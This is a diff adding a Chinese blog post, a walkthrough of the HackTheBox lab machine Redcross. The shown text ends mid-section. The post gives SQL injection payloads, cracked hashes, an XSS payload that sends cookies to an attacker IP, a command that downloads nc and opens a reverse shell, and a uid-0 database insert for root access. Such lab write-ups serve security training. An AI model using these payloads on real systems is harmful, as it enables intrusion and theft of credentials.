@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-material.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"evilarsene.icu","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Redcross我觉得非常有意思的一台，有多种攻击路线，还能用到XSS，而且难度不是很高">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB:Redcross">
+<meta property="og:url" content="http://evilarsene.icu/2020/10/29/HTB-Redcross/index.html">
+<meta property="og:site_name" content="Love ❤ Hacking">
+<meta property="og:description" content="Redcross我觉得非常有意思的一台，有多种攻击路线，还能用到XSS，而且难度不是很高">
+<meta property="og:locale">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/1.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/2.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/3.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/4.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/5.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/6.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/7.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/8.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/9.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/12.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/13.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/14.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/21.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/22.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/10.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/11.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/15.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/16.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/17.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/18.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/19.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/20.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/23.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/25.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/24.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/26.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/28.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/29.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/30.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/31.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/32.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/34.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/33.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/35.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/36.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/37.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/38.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/39.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/40.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/41.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/42.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/43.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/44.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/45.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/46.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/47.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/48.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/49.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/50.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/51.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Redcross/52.png">
+<meta property="article:published_time" content="2020-10-29T04:37:53.000Z">
+<meta property="article:modified_time" content="2020-10-29T14:11:59.527Z">
+<meta property="article:author" content="EvilArsene">
+<meta property="article:tag" content="Linux靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://evilarsene.icu/images/Redcross/1.png">
+
+<link rel="canonical" href="http://evilarsene.icu/2020/10/29/HTB-Redcross/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>HTB:Redcross | Love ❤ Hacking</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://github.com/TZESS" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Love ❤ Hacking</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">trickster</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://evilarsene.icu/2020/10/29/HTB-Redcross/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="EvilArsene">
+      <meta itemprop="description" content="人格面具操控者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Love ❤ Hacking">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB:Redcross
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-29 12:37:53 / 修改时间：22:11:59" itemprop="dateCreated datePublished" datetime="2020-10-29T12:37:53+08:00">2020-10-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackTheBox/" itemprop="url" rel="index"><span itemprop="name">HackTheBox</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Redcross"><a href="#Redcross" class="headerlink" title="Redcross"></a>Redcross</h1><p>我觉得非常有意思的一台，有多种攻击路线，还能用到XSS，而且难度不是很高</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>添加hosts</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.113    intra.redcross.htb redcross.htb</span><br></pre></td></tr></table></figure>
+
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Redcross/1.png" alt="1"></p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>登录首页，发现了疑似文件名参数</p>
+<p><img src="/images/Redcross/2.png" alt="2"></p>
+<p>证书提示了某个用户名</p>
+<p><img src="/images/Redcross/3.png" alt="3"></p>
+<p>目录枚举，知道对方在使用php，添加扩展名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u https:&#x2F;&#x2F;intra.redcross.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;zidian.txt -x .php -o dir.txt -t 10 -k</span><br></pre></td></tr></table></figure>
+
+<p>但这样枚举效率很低，有更好的字典作为选择</p>
+<p>枚举php文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u https:&#x2F;&#x2F;intra.redcross.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;Common-PHP-Filenames.txt -o dir.txt -t 10 -k </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Redcross/4.png" alt="4"></p>
+<p>没有枚举出太多，检查源代码</p>
+<p><img src="/images/Redcross/5.png" alt="5"></p>
+<p>发现还有一个/pages/目录下，存在php文件，继续枚举该目录</p>
+<p><img src="/images/Redcross/6.png" alt="6"></p>
+<p>发现了更多的文件，其中存在login.php</p>
+<p><img src="/images/Redcross/7.png" alt="7"></p>
+<p>可以发现，之前首页包含的就是这个文件，不过该参数测试后，应该不存在文件包含漏洞</p>
+<p>进行常规目录枚举</p>
+<p><img src="/images/Redcross/8.png" alt="8"></p>
+<p>发现了documentation目录，不过不显示文件</p>
+<p><img src="/images/Redcross/9.png" alt="9"></p>
+<p>对于改文件名，应该枚举常见文档格式pdf，txt</p>
+<p><img src="/images/Redcross/12.png" alt="12"></p>
+<p>发现了pdf</p>
+<p><img src="/images/Redcross/13.png" alt="13"></p>
+<p>使用wfuzz进行子域名枚举</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -H &#39;HOST: FUZZ.redcross.htb&#39; -u &#39;https:&#x2F;&#x2F;10.10.10.113&#39; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;DNS&#x2F;shubs-subdomains.txt --hw 28</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Redcross/14.png" alt="14"></p>
+<p>得到了admin子域</p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="第一步-成功登录到admin域"><a href="#第一步-成功登录到admin域" class="headerlink" title="第一步:成功登录到admin域"></a>第一步:成功登录到admin域</h3><p>回到最初的登录页面，已知的用户名<code>penelope</code>，尝试一些登录凭据组合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">password</span><br><span class="line">guset</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>
+
+<p><code>guest/guest</code>可以成功登录，或者之前的pdf的描述，提供了一个功能</p>
+<p>标题输入credentials，内容输入username=</p>
+<p><img src="/images/Redcross/21.png" alt="21"></p>
+<p>会告诉你临时凭据</p>
+<p><img src="/images/Redcross/22.png" alt="22"></p>
+<h4 id="方法1-guset登录SQL注入"><a href="#方法1-guset登录SQL注入" class="headerlink" title="方法1:guset登录SQL注入"></a>方法1:guset登录SQL注入</h4><p>登录成功发现一处查询点</p>
+<p><img src="/images/Redcross/10.png" alt="10"></p>
+<p>疑似容易受到sql注入攻击，并且数据库为MariaDB，且闭合应该为<code>&#39;)</code></p>
+<p><img src="/images/Redcross/11.png" alt="11"></p>
+<p>尝试sql报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,version(),0x7e),1)#</span><br><span class="line">&#39;) and extractvalue(0x0a,concat(0x7e,version(),0x7e))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Redcross/15.png" alt="15"></p>
+<p>中间过程省略</p>
+<p>爆用户名，一切正常</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,(select username from redcross.users limit 0,1),0x7e),1)#</span><br><span class="line">&#39;) and updatexml(1,concat(0x7e,(select username from redcross.users limit 1,1),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p>爆密码有些不一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,(select username from redcross.users limit 0,1),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Redcross/16.png" alt="16"></p>
+<p>得到<code>$2y$10$z/d5GiwZuFqjY1jRiKIPzuPX</code>，没有显示完全，可以使用substring()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,(select substring((select password from redcross.users limit 0,1)from 30)),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Redcross/17.png" alt="17"></p>
+<p>得到<code>Kt0SthLOyU438ajqRBtrb7ZADpwq.</code></p>
+<p>组合在一起就是<code>$2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq.</code></p>
+<p><code>hash-identifier</code>没有识别出哈希类型，直接放到john去破解</p>
+<p>破解出了charles用户的密码，这个哈希加密类型是blowfish加密，之破解出了charles的密码</p>
+<p><code>$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i</code>:<code>cookiemonster</code></p>
+<p><img src="/images/Redcross/18.png" alt="18"></p>
+<p>尝试使用sqlmap进行自动化注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli -p &#39;o&#39; --force-ssl --dbms mysql --batch</span><br></pre></td></tr></table></figure>
+
+<p>但是这里报错了，看起来是找到正确的注入点，但是对方停止了响应</p>
+<p><img src="/images/Redcross/19.png" alt="19"></p>
+<p>查看后是对方的waf或者其他安全策略，把我们给BAN了，所以sqlmap挂了</p>
+<p>这里可以通过delay设置请求之间等待时间，这会让攻击时间变长，因为原来请求之间没有时间间隔</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli --force-ssl --dbms mysql --batch --delay&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>这样sqlmap可以正常使用</p>
+<p><img src="/images/Redcross/20.png" alt="20"></p>
+<p>使用charles的凭据进行登录，页面没有多出可以操作的东西</p>
+<p>但是提示了alerts，联想到XSS</p>
+<p><img src="/images/Redcross/23.png" alt="23"></p>
+<p>尝试凭据登录admin域，失败</p>
+<p><img src="/images/Redcross/25.png" alt="25"></p>
+<p>将intra域的<code>PHPSESSID</code>替换到admin域的<code>PHPSESSID</code>，刷新页面，可以直接以charles的身份登录</p>
+<p><img src="/images/Redcross/24.png" alt="24"></p>
+<h4 id="方法2-guest会话固定"><a href="#方法2-guest会话固定" class="headerlink" title="方法2:guest会话固定"></a>方法2:guest会话固定</h4><p>intra域guest的<code>PHPSESSID</code>也可以直接登录到admin域的页面，这里谁的身份都无所谓，功能都能使用</p>
+<p><img src="/images/Redcross/26.png" alt="26"></p>
+<h4 id="方法3-XSS"><a href="#方法3-XSS" class="headerlink" title="方法3:XSS"></a>方法3:XSS</h4><p>之前给guest凭据的类似留言板的功能，存在XSS，这是一个盲打XSS的情况，可以直接窃取到管理员的cookie</p>
+<p>这里需要注意，xss的地点在电话那一栏，其他地方没有用。paylaod</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new Image().src&#x3D;&#39;http:&#x2F;&#x2F;10.10.16.4&#x2F;&#39;+document.cookie&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Redcross/28.png" alt="28"></p>
+<p>之后登录cookie登录admin域就是admin</p>
+<p><img src="/images/Redcross/29.png" alt="29"></p>
+<h3 id="第二步-shell"><a href="#第二步-shell" class="headerlink" title="第二步:shell"></a>第二步:shell</h3><p>首先有一个用户管理功能，可以添加用户</p>
+<p><img src="/images/Redcross/30.png" alt="30"></p>
+<p>但是权限很低，基本啥都干不了</p>
+<p><img src="/images/Redcross/31.png" alt="31"></p>
+<h4 id="方法1-防火墙→Haraka-RCE"><a href="#方法1-防火墙→Haraka-RCE" class="headerlink" title="方法1:防火墙→Haraka RCE"></a>方法1:防火墙→Haraka RCE</h4><p>页面有防火墙添加白名单功能，输入自己的ip，重新进行端口扫描，发现了新的端口</p>
+<p><img src="/images/Redcross/32.png" alt="32"></p>
+<p>1025没有得到指纹，尝试用nc或者telnet获得banner</p>
+<p><img src="/images/Redcross/34.png" alt="34"></p>
+<p>等了比较久的时间，发现了haraka，知道公开漏洞</p>
+<p><img src="/images/Redcross/33.png" alt="33"></p>
+<p>需要修改默认端口</p>
+<p><img src="/images/Redcross/35.png" alt="35"></p>
+<p>之后反弹shell，需要制定知道的邮箱地址<code>penelope@redcross.htb</code>，后来测试发现，用之前创建的用户<code>test@redcross.htb</code>也可以</p>
+<p>这个反弹shell非常慢，使用nc进行反弹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 41162.py -c &quot;cd &#x2F;tmp;wget http:&#x2F;&#x2F;10.10.16.4&#x2F;nc; chmod 777 .&#x2F;nc; .&#x2F;nc 10.10.16.4 443 -e &#x2F;bin&#x2F;bash&quot; -t penelope@redcross.htb -m 10.10.10.113</span><br></pre></td></tr></table></figure>
+
+<p>获得shell</p>
+<p><img src="/images/Redcross/36.png" alt="36"></p>
+<h4 id="方法2-命令注入"><a href="#方法2-命令注入" class="headerlink" title="方法2:命令注入"></a>方法2:命令注入</h4><p>添加防火墙白名单尝试进行命令注入，添加处注入失败</p>
+<p><img src="/images/Redcross/37.png" alt="37"></p>
+<p>deny处添加成功</p>
+<p><img src="/images/Redcross/38.png" alt="38"></p>
+<p>反弹shell命令即可</p>
+<p><img src="/images/Redcross/39.png" alt="39"></p>
+<p>不过这里权限更低一些</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先想到找凭据，因为之前mysql注入得到了MariaDB的内容，但是里面的凭据不能登录admin</p>
+<h3 id="方法1-设置uid"><a href="#方法1-设置uid" class="headerlink" title="方法1:设置uid"></a>方法1:设置uid</h3><p>首先找到postgresql</p>
+<p><img src="/images/Redcross/40.png" alt="40"></p>
+<p>找到mysql的凭据，不能切换用户，其他和sql注入一致</p>
+<p><img src="/images/Redcross/41.png" alt="41"></p>
+<p>搜索postgresql的连接函数pg_connect，可以找到凭据，在<code>/var/www/html/admin/pages/actions.php</code></p>
+<p><code>unixusrmgr/dheu%7wjx8B&amp;</code>和<code>www/aXwrtUO9_aa&amp;</code>，肯定用高权限</p>
+<p><img src="/images/Redcross/42.png" alt="42"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psql -h 127.0.0.1 -U unixusrmgr unix</span><br><span class="line">dheu%7wjx8B&amp;</span><br></pre></td></tr></table></figure>
+
+<p>之后找到常用命令:<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010856284/article/details/70142810">https://blog.csdn.net/u010856284/article/details/70142810</a></p>
+<p>之后找到了有意思的信息</p>
+<p><img src="/images/Redcross/43.png" alt="43"></p>
+<p>数据库存在uid和gid信息，还存在密码信息，密码格式为MD5(Unix)，尝试创建一个uid和gid为0的用户</p>
+<p>先生成密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~#openssl passwd -1 evil</span><br><span class="line">$1$H9HOvdAx$zqLN&#x2F;10955pMhZmGVvxrE0</span><br></pre></td></tr></table></figure>
+
+<p>再尝试插入，但权限不足</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO passwd_table (username, passwd, uid, gid, homedir) values (&#39;evil&#39;, &#39;$1$H9HOvdAx$zqLN&#x2F;10955pMhZmGVvxrE0&#39;, 0, 0, &#39;&#x2F;tmp&#39;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Redcross/44.png" alt="44"></p>
+<p>查看权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\dt</span><br></pre></td></tr></table></figure>
+
+<p>发现只能修改4个参数，其中不包括UID</p>
+<p><img src="/images/Redcross/45.png" alt="45"></p>
+<p>所以修改一下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO passwd_table (username, passwd, gid, homedir) values (&#39;evil&#39;, &#39;$1$H9HOvdAx$zqLN&#x2F;10955pMhZmGVvxrE0&#39;, 0, &#39;&#x2F;tmp&#39;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Redcross/46.png" alt="46"></p>
+<p>使用<code>evil/evil</code>进行ssh登录，获得了gid权限</p>
+<p><img src="/images/Redcross/47.png" alt="47"></p>
+<p>linpeas扫描，注意conf文件和密码文件，可以发现另一处postgresql凭据</p>
+<p><img src="/images/Redcross/48.png" alt="48"></p>
+<p>使用它们去登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psql -h 127.0.0.1 -U unixnssroot unix</span><br><span class="line">30jdsklj4d_3</span><br></pre></td></tr></table></figure>
+
+<p>发现这次可以修改gid了</p>
+<p><img src="/images/Redcross/49.png" alt="49"></p>
+<p>尝试修改uid权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update passwd_table set uid&#x3D;0 where username&#x3D;&#39;evil&#39;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Redcross/50.png" alt="50"></p>
+<p>重新ssh，但是不行，uid没变，尝试重新创建一个uid0用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~#openssl passwd -1 hacker1337!</span><br><span class="line">$1$PiRTDXDx$w8le9W0F7o9VeOI.bcfA61</span><br></pre></td></tr></table></figure>
+
+<p>最好也别把目录设置成<code>/tmp</code>了，目录一致可能有问题，需要把之前的uid0给改掉，这是一个primary key </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO passwd_table (username, passwd, uid, gid, homedir) values (&#39;hacker&#39;, &#39;$1$PiRTDXDx$w8le9W0F7o9VeOI.bcfA61&#39;, 0, 0, &#39;&#x2F;&#39;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Redcross/51.png" alt="51"></p>
+<p>成功提权</p>
+<h3 id="方法2-设置gid"><a href="#方法2-设置gid" class="headerlink" title="方法2:设置gid"></a>方法2:设置gid</h3><p>有很多的组都有很大几率获得权限提升:<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe</a></p>
+<p>查看sudo组编号</p>
